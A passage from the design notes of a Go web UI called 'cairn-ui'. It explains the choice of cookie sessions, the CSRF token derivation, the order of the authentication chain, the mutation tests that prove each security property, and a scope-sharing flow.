  here is over in-process fixtures for that reason; nothing in this package has been
  measured against a real store on disk, a real token file, or a real socket.
- **Concurrency.** Nothing runs two requests at the same instant.
- **A revoked credential.** This binary has no SIGHUP reload path, so a revocation takes a
  restart. That is a real operational difference from the pod and not something to assume
  away from the shared `control.Cache` type.

---

# Phase B — cookie sessions, CSRF, logout and expiry

## 🔴 The storage decision, and the three shapes it beat

The operator chose cookie sessions **over a client-held JWT**, and stated **two** requirements
rather than one. **(i) logout actually revokes** — a JWT is valid until its `exp` and nothing can
take it back. **(ii) sessions survive a process restart and a rolling deploy**, claimed on its own
authority and *not* derived from (i): the requirement is **"a rolling deploy signs NOBODY out"**,
with a brief 503 while a replica restarts being acceptable where a sign-out is not. Both priced the
four options. The canonical statement of all of this is `internal/identity/session.go`'s package
comment; this table is the echo.

| option | verdict | why |
|---|---|---|
| **(a) a file-backed store shaped like `control.FileStore`** | **CHOSEN** | durable across restart, revocable in one write, reuses mechanics this repo has already measured: exclusive `flock`, re-read UNDER the lock, `Sync` before success |
| (b) sessions as events in the control journal | rejected | 🔴 **the performance reason this row led with was FALSE and is corrected, not softened.** It said the replay runs on every call "and every authenticated request calls it"; the second clause is wrong — every serving path reads through a `control.Cache`, so the replay is once per 30s refresh, and `cairn-ui` wires no `FileStore` at all. The reasons that hold: a cached authority makes logout **eventual** (up to one refresh interval), and bypassing the cache to make it immediate is what *would* reinstate replay-per-request; the journal's volume is **ReadWriteOnce on a node-local class**, so sessions in it pin every UI replica to one node — multi-replica dies by construction; and the category objection survives both — the journal answers "who could see this, and when", and an operator reading it for a grant history would be reading it through session noise. Full statement: `internal/identity/session.go`, option (b) |
| (c) a signed stateless cookie plus a revocation list | rejected | it is (a) with extra parts. The revocation list is a durable store that must survive restart or logout is a lie, so nothing is saved; it adds a signing key, which is a new secret with a new rotation story; and entries must be kept until each revoked token's `exp`, so it is a store that can only GROW. A session id is already an unguessable 256-bit value — signing it proves nothing the lookup does not |
| (d) in-memory only | rejected | every restart signs everybody out, which on a rolling deploy is not rare. And it is a **new kind** of multi-replica failure rather than a worse version of the declared one |

⚠ **On (d) and `internal/control/README.md`'s "two pods over one journal" blind spot, precisely.**
That blind spot is *divergence about one durable truth* — two caches at different epochs, which
converges. An in-memory session table has no shared truth to converge on: a session opened on pod
A does not exist on pod B and never will, so a load balancer without sticky sessions signs the user
out on a random fraction of requests. (d) makes the declared blind spot worse **in that sense**.

🔴 **And the honest half, said operationally rather than gently: `cairn-ui` is a SINGLE-REPLICA
surface today.** (a) does not FIX replication — it inherits exactly the journal's shared-filesystem
assumption, no more and no less, and it ends where the journal's does, at the second
`control.Store` implementation. **A second replica without shared storage is not a degraded version
of this design; it is a surface that signs users out on a random fraction of requests** — the same
failure the table above rejects (d) for. And "share the filesystem" is visibly not a configuration
away: the journal's volume is **ReadWriteOnce on a node-local storage class**, so a shared session
file pins every replica to one node.

⚠ **The direction, recorded as a direction and not as a commitment.** Requirement (ii) is met on
one replica because the volume outlives the process. For more than one, the intended answer is
**sticky routing — a StatefulSet with a per-ordinal volume**, each replica owning its own session
table and returning to it after a restart. No Go change; stdlib-only intact. **Multi-replica
sessions is its own arc**, and it is where the cross-replica storage decision gets made — including
`FileSessionStore.Revoke`'s cost, which runs the full `mutate` (`flock`, whole-file re-read,
rewrite, two `Sync`s) even for a digest that is ABSENT: no privilege is gained by a caller who
already holds a bearer credential, but over shared storage it is a lock-contention amplifier.

### Where it diverges from `control.FileStore`, and why

`FileSessionStore` **rewrites** where the journal **appends**. The journal is append-only because
the authority it holds is; a session table's whole content is the set of sessions live *right now*.
Appending would mean a file growing without bound at login rate, a replay getting slower forever,
and a revocation that is a later line SHADOWING an earlier one rather than an absence. The rewrite
forces the lock onto a **side file**, for the reason `internal/write/atomic.go` already records: a
temp-file-plus-rename changes the inode, so a lock on the old one is held on a file nobody is
looking at. Third site, same ruling, not a fourth answer.

Two more rulings that deliberately differ from the journal's:

- **a malformed line is REFUSED, not skipped.** There, an unreadable journal degrades to
  last-known-good because an empty authority is a total outage. Here the content is a set of live
  credentials and the next write rewrites the whole file, so a skipped line is a session silently
  dropped — a user signed out with no error anywhere — and a `Revoke` that reports success having
  rewritten a file that never held the record it was asked to remove.
- **a store that cannot be read refuses every session.** Serving from a remembered copy would be
  serving credentials somebody may have just withdrawn.

## 🔴 Where the fourth backend sits in the chain, and why

`identity.Backends(machine, supabase, cookie, trusted)` — the cookie is **third of four**. The
positional signature did its job: adding it broke every caller until each had decided.

The new rule, beside the two `Chain`'s comment already carried: **every explicitly-presented
credential is tried before the one the browser sends by itself.** An `Authorization` header is
set by a caller who decided to; a cookie is *ambient* — the user agent attaches it to every
request to this origin, including one a different site caused. A request carrying both resolves
as the header's principal. The other ordering lets a stale cookie silently shadow a deliberately
presented credential, and the person debugging it is reading a page rendered for a principal they
did not ask to be.

⚠ It is **not** a CSRF defence: a cross-site request carries no `Authorization` header either, so
the ordering changes nothing there. ⚠ The cookie sits *before* the trusted header because the
latter's precondition is a deployment declaration — satisfied for every caller who can reach the
socket — while a cookie is at least a credential this surface minted for one browser. No
deployment has both; `ui.AuthBackends` refuses the trusted header outright, so that half of the
ordering is a decision recorded before it can be reached.

**`TrustedHeader` is still absent from the UI chain**, and the pin is now taken over the *widest*
chain `AuthBackends` can build — with a cookie backend present — because a pin over the narrowest
would go green for a constructor that forwarded a trusted header only when a cookie was also
supplied.

## 🔴 The two cross-site gates, and why neither is a route class

`Server.ServeHTTP` runs six gates in a fixed order. The two that matter here are **derived from
the METHOD** (`stateChanging`), never opted into by a row:

1. **same-origin**, on every state-changing method, **before** authentication. It compares
   `Origin` against `Host`. That sounds circular and is not: a browser sets `Origin` from the page
   that MADE the request and will not let that page lie, so an attacker's page sends its own
   origin with our host. A **missing `Origin` is refused** — fail-closed, at the cost that a
   `curl` driving this surface must set the header. It runs before auth because that is the only
   thing standing in front of the **public** sign-in row, which by definition has no session to
   carry a token. ⚠ The scheme is deliberately not compared: this process cannot know whether it
   is behind a TLS-terminating proxy without trusting `X-Forwarded-Proto`, which is the
   `TrustedHeader` hazard in miniature.
2. **the per-session CSRF token**, **after** authentication — which is what makes it *reachable*
   rather than shadowed. A token check ahead of the chain would refuse every anonymous request
   first, so "a POST without a token is refused" would pass against a server whose token check did
   nothing at all.

🔴 **A class can only make a route LESS protected**, which is why there are exactly two
(`public`, `content`) and why neither is `csrf`: a per-row opt-in to a security check is a check
somebody forgets to opt a new row into, silently. Each class is spelled out in the hand-written
ledger in `routes_test.go`, so adding a row means writing its class by hand.

🔴 **THE "URL SPACE IS NOT MAPPABLE" PROPERTY IS RETRACTED, AND THE RETRACTED TEXT IS KEPT
BECAUSE IT WAS THE STATED REASON FOR A DESIGN.** It read: *"Before Phase B every path but
`/healthz` answered the same uniform 401, so an unauthenticated caller could not tell a route
from a typo. `GET /sign-in` answers 200 to anybody — the URL space is now mappable to the extent
of the two public rows … `GET /` was not made to redirect to `/sign-in`, though that is the
browser-friendly thing: a 303 for `/` beside a 401 for `/admin` is exactly the enumeration the
uniform answer prevents."*

The premise is void, and it was void when it was written: **this repository is PUBLIC and
`routes.go` publishes every row.** The map is the source file, and `cairn-ui`'s startup line
already counts it. So the guard was paying a real cost — a browser landing on a mistyped path was
told it was *unauthorized*, and "this is not a route" was indistinguishable from "your credential
is wrong" in this surface's own tests — for a property an attacker could get by reading the repo.

What replaced it, and what was deliberately kept:

- an undeclared path is now **404 with the `noSuchRoute` body**, and
  `TestEveryServedPathComesFromTheLedger` asserts both. That is a *stronger*
  anti-stale-handler assertion than the 401 was: a stale handler renders HTML, redirects, or
  answers 200, and cannot produce either of those. The `GET /entries` probe — a path that WAS a
  row — is still in the list, and it is why the test exists.
- **the uniform refusal for a BAD CREDENTIAL stays**, and that was always the half worth its
  cost: it is an oracle over the credential TABLE, not over the URL space. No refusal on this
  surface says which part of a credential was wrong.
- an unauthenticated caller still cannot tell routes from a typo, because gate (4) runs
  before gate (5) — a consequence of the gate ORDER rather than a guard anybody maintains.
  ⚠ **While the browser redirect was root-only, the root was the one exception** (a browser
  asking for `/` got 303 where `/nonsense` got 401). Phase N removed the exception by widening
  the redirect to every path: a browser now gets the same 303 for both, differing only in the
  echoed `?next=`.
- **A browser navigation DOES redirect now**, 303 to `/sign-in` — first `GET /` alone, then, in
  Phase N, every path with the request-URI carried as `?next=`. It is scoped to `GET` (not `HEAD`), an
  `Accept` carrying `text/html`, and NO `Authorization` header; every other method, every other
  client and every failed bearer keeps the uniform 401 byte for byte, so the machine contract is
  unmoved. `TestTheRootRedirectsABrowserAndRefusesEverythingElse` and Phase N's tests probe each
  dimension with the others held at the redirecting value.

## 🔴 The CSRF token is derived, not stored

`CSRFTokenFor(id) = base64url(HMAC-SHA256(key = the session id, msg = "cairn-csrf-v1"))`. No second
secret, no second stored field, and three properties fall out:

- **computable from the COOKIE and nothing else.** A cross-site attacker can make the browser
  *send* the cookie but not *read* it (`HttpOnly` stops script, the same-origin policy stops a
  response being read), so they cannot derive the token. That is the whole CSRF property.
- **not computable from the STORE.** The store holds `sha256(id)`, and a digest is not a key — so
  somebody who reads the session file cannot mint a token. A stored random token would have made
  that file a forgery kit.
- **rotates and dies with the session for free.**

⚠ It is rendered into the page on purpose; that is what a hidden form field is. Disclosing a MAC
does not disclose its key. `hmac.Equal` compares it, and **there** constant time is load-bearing:
the presented value is chosen by the requester, so an early-returning comparison is an oracle
anybody can drive — submit, measure, extend by one byte, repeat.

## The cookie, and one unverified claim

`__Host-cairn-session`, `HttpOnly`, `Secure` (unconditional), `SameSite=Lax`, `Path=/`, no
`Domain`. Each flag refuses something specific rather than being good practice — see
`session.go`. Two are worth repeating here:

- `Secure` has **no opt-out**, because an env var to disable it for local development is a
  variable that ends up set in production.
- `SameSite=Lax` rather than `Strict` so an ordinary link into the surface still works, and it is
  **not** treated as the guard: it is a browser-side property this server cannot verify, and
  "same site" still includes a sibling subdomain.

🔴 **`__Host-` and the `Secure`-on-`http://localhost` allowance are claims about BROWSERS and
nothing here has measured either.** The prefix's value is that a sibling host cannot plant a
cookie we will honour — session fixation performed entirely outside this process, invisible to
every guard in this package. Its failure direction is safe (a browser that ignores the prefix
treats it as an ordinary name), so being wrong costs a guard we thought we had, not an opening.

## The seven properties, each proven RED

Every mutant below was confirmed to **BUILD** first — a mutant that dies at the compiler proves
nothing — and each is asserted to fail with **its own message**, because a kill by a different arm
is a misattribution that reports a deleted check as covered.

| # | property | mutant | killed by, with its own message |
|---|---|---|---|
| 1 | cookie flags | `HttpOnly: true` → `false` | `…does not carry HttpOnly` (constructor **and** real sign-in) |
| 1 | | `Secure: true` → `false` | `…does not carry Secure` |
| 1 | | `SameSiteLaxMode` → `SameSiteNoneMode` | `…does not carry SameSite=Lax` |
| 2 | CSRF | the gate `if false && …` | `THE STATE CHANGE WAS PERFORMED` |
| 2 | | `csrfTokenValid` → `return true` | `THE STATE CHANGE WAS PERFORMED` |
| 2 | | the HMAC keyed on the LABEL instead of the id | `…derive the SAME CSRF token` |
| 3 | comparison | `hmac.Equal` → `==` | `NO \`hmac.Equal\` CALL REMAINS` |
| 3 | | `subtle.ConstantTimeCompare` → `==` (plus the import) | ``NO `subtle.ConstantTimeCompare` CALL REMAINS`` |
| 3 | scan | a `break` on match | `THE SCAN SHORT-CIRCUITS` — now **structural**, naming `break` and its line |
| 3 | scan | an early `return` on match | `THE SCAN SHORT-CIRCUITS` — naming `return` and its line |
| 3 | entropy | `SessionIDBytes` 32 → 16 | `SessionIDBytes is 16, want 32` |
| 4 | expiry | `Live` → `return true` | `AN EXPIRED SESSION WAS SERVED` |
| 4 | | `now.Before(exp)` → `!now.After(exp)` | `the expiry instant itself` |
| 5 | logout | `Revoke` becomes a no-op | `THE REVOKED COOKIE STILL AUTHENTICATES` |
| 5 | | a process-local memo absorbs revocations but not creations — a **Create-persists / Revoke-doesn't hybrid**, narrower than any option priced above | `THE REVOKED SESSION CAME BACK AFTER A RESTART` |
| 6 | fixation | the sign-in revocation removed | `THE PRE-SIGN-IN SESSION IS STILL LIVE` |
| 7 | secrets | the session id added to the sign-in log line | `THE LOG CONTAINS the session id` |
| 7 | | the submitted token echoed into the refusal page | `THE REFUSED SIGN-IN PAGE CONTAINS the wrong credential` |
| — | origin gate | `if false && …` | five arms, `want 403` |
| — | | a missing `Origin` accepted | `no Origin header at all` |
| — | chain order | the cookie appended FIRST | `…resolved to … the COOKIE's principal` |
| — | UI chain | `AuthBackends` forwards a live `TrustedHeader` | `THE UI CHAIN CONTAINS 1 *identity.TrustedHeader MEMBER(S)` |
| — | authority | the content route skips `Source.Visible` | `…rendered a page WITHOUT consulting the <name> authority it answers from` |
| — | ledger | an undeclared `public` row added | `the declared route set is …` |
| — | class | a second HTML route added WITHOUT the `content` class | `GET /dup answers 200 with an HTML body and is NOT classed \`content\`` |
| — | class | the one content route's class removed | `NO route in the ledger carries the \`content\` class` (the vacuity arm) |

**26 mutants, 26 killed, 0 survived**, after two were re-cut and one property changed instrument:

- 🔴 **THE SCAN GUARD IS NOW STRUCTURAL, AND THAT IS A DELIBERATE TRADE RATHER THAN A LOSS.**
  `TestTheSessionScanDoesNotShortCircuit` measured the property with a `comparisons atomic.Int64`
  field on `FileSessionStore` — an instrument in the SERVING path, incremented once per record on
  every request by every replica, existing for one test. The field is deleted; the property is now
  pinned by `TestTheLookupScanHasNoEarlyExit`, which parses `sessionstore.go` and refuses a
  `break`/`continue`/`goto`/`return` inside `Lookup`'s digest loop. **Four arms, all confirmed to
  BUILD first:** a `break` and an early `return` each fail with `THE SCAN SHORT-CIRCUITS` naming the
  statement and its line; rewriting the `range` as an index loop and replacing `digestsEqual` with
  `==` each fail the guard's own POSITIVE CONTROLS ("contains no `range` statement at all" / "does
  not call `digestsEqual`"), because "found no `break`" and "found no loop" are otherwise the same
  green. ⚠ **What it cannot see, stated:** it pins the loop's ITERATION COUNT — what the counter
  measured — and not the per-iteration COST, so a body whose work depends on whether *this* record
  matched would leak the same fact with no branch statement anywhere. That half is `digestsEqual`'s
  and row 3's `subtle.ConstantTimeCompare` guard's. Moving the scan out of `Lookup` is *not* in the
  gap: the positive controls fire when the `range` or the `digestsEqual` call leaves the function.

- 🔴 **one mutant was REFUSED A KILL BY THE PAIR ASSERTION, and that is the finding.** The first
  "logout is not durable" mutant skipped the rename entirely — which breaks *creation* too, so
  `TestLogoutRevokes…` failed on its OTHER arm (*the untouched session did not survive the
  restart*) rather than on the revocation one. The pair assertion exists precisely so a store that
  refuses everything cannot score a kill, and it worked. It was re-cut as the memo above, which is
  narrower **and more faithful**: creation persists, revocation does not. ⚠ That row used to call the
  re-cut "**option (d) in one edit**", which was wrong and is corrected: (d) is in-memory-only, where
  **neither** create nor revoke persists. The re-cut is a Create-persists / Revoke-doesn't hybrid —
  *narrower than any option that was priced*, which is the entire point of re-cutting it, and the old
  label threw that away.
- one mutant initially **did not build** (dropping the `subtle` call left its import unused) and
  was re-cut to remove both.

### 🔴 The CSRF reachability proof, stated separately

Every arm of `TestTheCSRFGuardIsReachedByAnAuthenticatedRequest` is **authenticated** (a real
sign-in, a real cookie) and carries a **correct `Origin`**, so gates (1)–(5) cannot refuse it and
the only thing left is gate (6). Each arm asserts three things rather than "it was refused":

1. the status is **403, not 401** — a 401 would mean the *authentication* chain refused it, making
   the test evidence about the chain;
2. the body is **`csrf token missing or invalid`, not `cross-site request refused`** — the two
   gates answer the same status and a test reading the status alone would score one as the other;
3. the state did **not** change — the session is still live afterwards, because a refusal that
   performs the action is worse than no gate.

And the **positive control runs first**: that exact request *with* a valid token must answer 303,
or every refusal below it is about a route that never works. The five arms are: no token, an empty
token, another session's well-formed token, the token with one character changed, and the session
id itself presented as the token.

### The env-ledger question, measured

Phase B adds `CAIRN_UI_SESSION_FILE` and `CAIRN_UI_SESSION_TTL`, and both are read by
`cmd/cairn-ui` — like `CAIRN_UI_HOST`/`CAIRN_UI_PORT` already are — **not** by `internal/identity`,
so neither belongs in that package's ledgers. `identity.FromEnvironment` passes `nil` for the
cookie backend, deliberately: the pod is an API with no way to *set* a cookie, and a pod resolving
a session it could never issue would be honouring a credential minted by a different binary against
a store it does not own.

🔴 **The ledger guard WAS checked for the failure the task warns about, rather than assumed.** An
extra exported `Env*` constant declared in neither ledger was added, and
`TestTheEnvironmentLedgersNameEveryVariableEachBackendReads` went **RED** naming it
(`the ledgers and the constants disagree … CAIRN_UI_SESSION_FILE`), GREEN on restore. It reads the
constants out of the package's own **source**, which is what lets it see the set GROW; the
hand-written list it replaced could only ever have seen it shrink.

⚠ `cmd/cairn-ui`'s `envDuration` falls back on an unparseable value rather than refusing, matching
`envInt` beside it and **not** matching `internal/identity`'s ledger, which refuses a mistyped
duration. Left consistent with its neighbours rather than made a one-off; the divergence between
this program's ad-hoc environment reads and that package's ledger is a thing to close in one
change, not here.

### 🔴 The guard this change could itself have emptied, and how it was closed

**Twice now, and the second one is the review round's own edit.** Deleting the `comparisons`
counter deletes the *only* measurement of "the scan does not short-circuit" — the exact shape this
heading exists for. It was checked rather than assumed: the package's other tests were run against a
`break` mutant with the counter test already gone, and **only** the new structural guard noticed, so
nothing else was silently carrying the property. The guard is proven red on `break` and on `return`,
and its two positive controls are proven reachable. What was NOT preserved is the behavioural
observable; that is recorded beside the mutant table and in `Lookup`'s own comment rather than left
for the next reader to find.

`TestEveryContentRouteConsultsTheAuthority` used to walk **every** declared route. Phase B made
it walk only the rows that declare themselves `content` — which is a hole in the shape this
repository names: a new page route added *without* the class is skipped by the walk, and the
hand-written ledger test passes for a row written out with no class at all. Two rows, two
guards, and nothing requiring the second to ask the authority.

It is closed by **deriving** the class rather than trusting it: every non-public `GET` that
answers 200 with an HTML body **is** a content route, whatever its class says, and must carry the
class. Proven red at both ends — the derivation arm fires on a second HTML route added without the
class, and the vacuity arm fires when the only content route loses its.

The other narrowing is declared rather than closed: `TestAnUnauthenticatedRequestReachesNoRenderer`
now skips public rows, with a `checked == 0` fatal so a tree in which *every* row went public
cannot pass it silently. And `{"POST", "/"}` moved out of the undeclared-path probe list into a
new one that sets a correct `Origin`, because gate (2) now runs before the ledger and the probe
would otherwise have passed with the ledger deleted.

## What Phase B's tests still structurally cannot see

Everything in Phase A's list still applies, and three of them now matter more:

- 🔴 **A REAL BROWSER. Nothing in this repository has been driven against one, at any phase.**
  Every cookie assertion is over a rendered `Set-Cookie` header; `HttpOnly`, `Secure`, `SameSite`
  and the `__Host-` prefix are all enforced **by the browser**, so what is measured here is that
  the server *asks* for them. Nothing measures that a browser honours the ask.
- **Concurrency is now partly covered and not fully.** `go test -race ./...` is clean over 19
  packages, and `FileSessionStore` takes a process mutex ahead of an exclusive `flock` — but no
  test drives two requests at the same instant, and no test runs two *processes* against one
  session file. The cross-process claim rests on `flock` plus rename atomicity, argued from the
  same reasoning `control.FileStore.Append` records, not measured here.
- **The `nix` check sandbox still pins dimensions.** `checks.go-client-declares-its-verbs` and the
  UI derivation's own check phase have no store, no token, no network and no HOME; the session
  tests use `t.TempDir()` and run inside `go test`, so they DO exercise a real file — but nothing
  exercises a real deployment, a mounted volume, or the `/var/lib/cairn-ui` default path.
- **Login CSRF beyond the origin gate.** The public sign-in form carries no token because there is
  no session to derive one from; the same-origin gate is the whole defence there, and it is a
  browser-behaviour claim in the same way the cookie flags are.
- 🔴 **A SESSION VOLUME THAT VANISHES *AFTER* START.** `cmd/cairn-ui/main.go` refuses to start when
  the session table cannot be opened — correct, and it says why — but `/healthz` answers `ok`
  unconditionally ahead of the whole chain (`internal/ui/server.go`), so a replica that loses its
  session volume after startup **passes readiness and refuses every login**: exactly the shape the
  startup refusal exists against, arriving by the one route the refusal cannot cover. Nothing here
  measures it, and nothing in this PR changes it.

## 🔴 What a session can be minted from — and why a NARROWED credential is not one of them

A session row records a PRINCIPAL and nothing else, and `identity.CookieSession` re-resolves
`control.Resolve(model, principal)` — the principal's **full** authority — on every request (that
is what makes revocation take effect on the next page load). So whatever reaches `openSession` is
promoted to everything its principal can read. Two doors reach it:

| door | where the principal comes from | narrowing to lose? |
|---|---|---|
| `POST /sign-in` (`handleSignIn`) | a pasted credential, via `control.Authenticate` | **yes** — refused when `auth.Narrowed()` |
| `GET /sign-in/github/callback` (`handleOAuthCallback`) | a provider identity (and possibly an invitation) | no — there is no credential |

**A narrowed credential is refused at sign-in** (operator decision, over the alternative of storing
the narrowing on the session row). Before this, a token narrowed to one scope pasted into the form
opened a session that read every scope its owner can — measured RED by
`TestANarrowedCredentialCannotSignIn`, which resolves the minted cookie and asserts the session
reads a scope outside the narrowing — defeating the narrowing, whose whole purpose is bounding what
a leaked token reaches. 🔴 **A NEW door into `openSession` must hold the same line**: a principal
that arrived on a narrowed credential is never promoted to a session. The rules it pins:

- **"Narrowed" is `control.Authorization.Narrowed()`** — set by `control.Narrow` whenever the
  credential's `NarrowedScopes` is non-nil — never a comparison against the principal's full
  authority. So a narrowing to **nothing** (non-nil empty) is refused, and so is a narrowing
  **equal to today's full set**: it is still a narrowed credential, and a session would pick up
  every scope granted after sign-in.
- **The refusal is the uniform one** — same 401, same `signInRefused` body, byte for byte
  (`TestANarrowedSignInIsIndistinguishableFromAWrongToken`); a distinct answer would confirm the
  token is real. The reason goes to the operator log only (`sign-in refused: the credential is
  narrowed — <client>`), with no token or digest.
- **It counts toward the lockout** like any refused sign-in
  (`TestANarrowedSignInCountsTowardTheLockout`): an uncounted path is a measurable difference and a
  free retry loop.

🔴 **THE BEARER PATH HONOURS THE NARROWING FOR SCOPES — BUT MEMBERSHIP AUTHORITY WAS THE SAME BUG.**
`identity.MachineToken` hands the narrowed `Authorization` through (`machinetoken.go`, the `Auth:
auth` field), so every scope read on this surface is bounded. The invite flow is not scope-shaped:
`Inviting` decides from the principal's project ROLE, which no scope narrowing bounds, and a bearer
caller passes the CSRF gate with a cookie of its own choosing. A narrowed token could therefore mint
an invitation into its owner's project and redeem it as an identity its holder controls. The invite
handlers now act as `membershipActor(id)`, the zero principal for a narrowed caller, so `Invitable`
lists nothing and `mayManage` refuses — on all three rows: the project page
(`TestANarrowedBearerSeesNoInvitations`), mint (`TestANarrowedBearerCannotMintAnInvitation`) and
revoke (`TestANarrowedBearerCannotRevokeAnInvitation`).

🔴 **THE SHARE FLOW'S CANDIDATE LIST IS MEMBERSHIP-DERIVED TOO, AND IS CLOSED THE SAME WAY.**
`Sharing.Candidates` enumerates everyone the principal shares a project with, so a narrowed caller
holding `admin` on a scope inside its narrowing was shown — and could share with — collaborators
from projects its narrowing excludes. It is now called with `membershipActor(id)`, so a narrowed
caller gets NO candidates and therefore cannot share through this surface at all (`handleShare`
validates the subject against the same list). Chosen over "filter to the candidates within the
narrowing" because a membership has no scope dimension: any such filter would be an invented rule
linking the two, a second authority decision outside `internal/control`
(`TestANarrowedAdminBearerIsOfferedNoShareCandidates`).

**One rule, one place, and a ledger that enforces it:** every use of an actor-taking method of
`Inviting`, `Sharing`, `ControlInviting` or `ControlSharing` in this package's non-test code passes
`membershipActor(id)`, pinned by `TestEveryMembershipDecisionActsAsMembershipActor`. The receiver is
resolved by TYPE (`go/types`, run with no importer — the four types are local), so a local alias, a
helper taking the interface, a renamed field or a direct `Control*` value is seen, and a METHOD
VALUE (whose actor cannot be read at the site) is refused outright; the whole set is a literal, so it
also fails when a site appears or disappears. `TestTheMembershipLedgerCanGoRED` keeps one arm per
shape. ⚠ The first version matched the spelling `<x>.inviting.M(...)` and an auditor walked it with
`inv := s.inviting` — measured PASS — which is why it is type-based now. ⚠ What it still does not
see — measured, and deliberately not chased further (the real call sites are guarded by the
behavioural tests named above): a struct EMBEDDING `Inviting`; a generic helper with a
type-parameter receiver; a function literal in a package-level `var`; a type assertion on a
value of an IMPORTED type (the checker runs with no importer, so such an operand is invalid and
the call is silently dropped rather than reported); a locally declared interface with the same
method; the value converted to a DIFFERENT interface type declared elsewhere; a value passed out
of the package; reflection. Exemptions, each commented
on its own ledger line: `Share`/`Unshare` (the principal is the journal's ACTOR — attribution; the
authority is the narrowed `id.Auth`), `handleOAuthCallback`'s `RedeemFor` (a provider principal with
no credential behind it), and `ControlInviting.Redeem` delegating to `RedeemFor`.

# Phase C — the share flow

Three routes (`GET /share`, `POST /share`, `POST /unshare`), one new seam (`Sharing`), and one
sentence pinned whole. This is the clause the control-plane arc's closing condition names: *a
scope granted from one user to another, served through the browser, with its replica-honesty
notice pinned by a test.*

## 🔴 "Who has access to this" is computed from `control.Resolve`, never from `Model.Grants`

Authority arrives **two ways** — `control.Resolve`'s own comment enumerates them — and only one of
them is a grant row:

1. **Ownership.** A user who is a member of the project owning a scope reaches it at their role's
   verbs, with **no grant row anywhere in the journal**.
2. **Sharing.** A live grant names the principal, or a project they belong to.

A page that answered "who has access to this" from the grant table would **under-report every project
member**, and silently: the list would be short, plausible, and wrong in the direction that tells
somebody their notes are more private than they are. `ControlSharing.Audience` therefore resolves
**every principal the model holds** and asks `VerbsOn(scope)`. That is O(principals × grants log
grants) per page against the grant read's O(grants); the cost is accepted and the reason is written
beside the function. ⚠ **The measurement now EXISTS** — `BenchmarkAudience` re-derives it; see `Audience`'s comment.

`Revocable` **is** read from the grant table, and that is the other half of the decision: grants
are the only thing this surface can take back. The two lists render separately with a sentence
between them saying why, because a reader who revokes every row and expects the audience to empty
has misunderstood the model.

`TestTheAudienceIsComputedFromResolveNotFromGrantRows` pins it with a viewer who holds authority
and **no grant row at all**, and asserts the grant table is empty first — without that second
assertion a grant-reading implementation could pass.

## 🔴 The replica-honesty notice is pinned as ONE NORMALISED STRING

`ReplicaHonesty` is a constant and `TestTheReplicaHonestyNoticeIsPinnedWhole` compares the rendered
page against the whole of it, with HTML entities resolved and whitespace collapsed. A guard on
keywords — "the page mentions `cache`" — survives a reword that has quietly dropped a clause, and
the clause a well-meaning edit drops is always the one that makes the product sound weakest. The
cost is that **any** cosmetic reword reds the test. That is the intended cost.

Each of its three clauses is a fact measured elsewhere in this tree:

| clause | what makes it true |
|---|---|
| "one replica's answer, read from a cached copy of the authority" | `control.Cache` is stale by design up to its declared `MaxAge`; `cairn-ui` is single-replica — see `identity.FileSessionStore`, whose own comment states it. ⚠ This cell ended "the `ui-image` derivation now exists but nothing publishes or deploys it"; the image is published and deployed, and the single-replica limit rests on the session table rather than on that |
| "another reader gains or loses the scope when their own cache next refreshes" | `control.Cache.ApplyNow`'s promise is explicitly about THIS process |
| "does not recall entries already copied onto somebody's machine" | `ApplyNow` says it in as many words |

It carries **no number**. A "within 30 seconds" would be a promise about a refresh interval this
package does not own and an operator can change; the bound that IS known travels per write, as
`Effect.EffectiveBy`, and `control.EffectDeferred`'s own comment makes rendering it mandatory
rather than stylistic.

## The decisions, and what each one costs

- **The scope is a QUERY PARAMETER, not a path segment.** `routes` is an exact-match map; a path
  parameter means a prefix match, and a prefix match is a second way to reach a handler that
  `TestEveryServedPathComesFromTheLedger` structurally cannot probe — there is no longer a finite
  set of paths to probe.
- **`/unshare` is its own path, not an `action=` field on `/share`.** A hidden action field makes
  the difference between granting and revoking a value chosen by whoever gets one request past
  both cross-site gates. Two paths make the two writes two rows in the ledger.
- **The recipient is a `select` over `Candidates`, and `Candidates` is the actor's own
  collaborators.** A picker over every user turns admin on one scope into a directory of everybody
  in the deployment. 🔴 **The cost is real and is not hidden: sharing with somebody you have no
  project in common with is NOT REACHABLE from this page.** Lifting that is an invite flow (P6).
- **The handler re-validates the chosen subject against the same list.** A `select` constrains a
  browser, not an HTTP client.
- **A revocation is authorised from the GRANT ROW, never from the form.** The grant id is the only
  thing that says which scope a revocation touches. Passing a scope alongside it would let a caller
  with admin on scope A revoke a grant on scope B.
- **The outcome after a write is a CODE from a closed set, not a sentence.** A write redirects so a
  refresh does not repeat it, and a redirect target is something anybody can put in a link. A
  reflected sentence is not an XSS bug and is still an attack: the escaper turns markup into text
  and has nothing to say about this page presenting an attacker's sentence as its own. The only
  caller-supplied value that reaches the banner is an instant this code parsed and re-formatted.
- **An unknown scope and an unauthorised one answer identically**, status and body. A 404 beside a
  403 is an existence oracle over every scope in the deployment.

## 🔴 A read-only deployment says so on the PAGE, and the first draft of that test SKIPPED

`cairn-ui` gained a `-control-journal` flag. With it the authority is a `control.FileStore` and a
share can be recorded; without it the authority is the token-file projection and it cannot. The
flag **switches** the authority rather than adding one — two authorities would be two answers to
"who may see what".

🔴 **BECAUSE IT SWITCHES THE AUTHORITY, `CAIRN_UI_CONTROL_JOURNAL` IS THE ONE VARIABLE THIS BINARY
READS RAW RATHER THAN THROUGH `internal/envalias`.** `envalias` reads a whitespace-only value as
ABSENT, which for a listen address is a default and for this name is a silently different
authority — the token-file projection, which confers `admin` on nobody. `cmd/cairn-ui`'s
`controlJournalDefault` refuses it instead, the ruling `cmd/cairn-server`'s `controlJournalPath`
already makes for the pod. Numbers, the two-binary measurement and what the other four `CAIRN_UI_*`
names do with whitespace: `tests/conformance/README.md`, the blank-policy section. No copy of them
here, deliberately.

The first version of this feature reported the read-only condition only when somebody clicked
Share, and its test asserted a 501. **That test skipped, and the skip is why the design changed:**
`internal/control/tokenfile` grants **no `admin` verb to anybody** — its own comment says the token
file "has no sharing to administer" — so on such a deployment the authority check refuses first and
the 501 arm is never reached. A skip nobody counts is a pass. So `control.Cache` gained `Writable()`
(derived from the same type assertion `write` already made, not a second one), the page announces
`ReadOnlyAuthority` on every load, and two tests replace the one that skipped: one measures the
sentence on a real token-file deployment **and** asserts a journal-backed deployment does not
render it; the other pins the 501 mapping through the real dispatcher and **says plainly that it
drives the condition through a fixture**, because no authority in this tree is both read-only and
able to confer admin.

## The mutation rows — in `tests/control_mutants.py`, which CI runs

🔴 **THERE IS NO SEPARATE BATTERY FOR THIS PACKAGE, AND THE ONE THAT BRIEFLY EXISTED IS THE
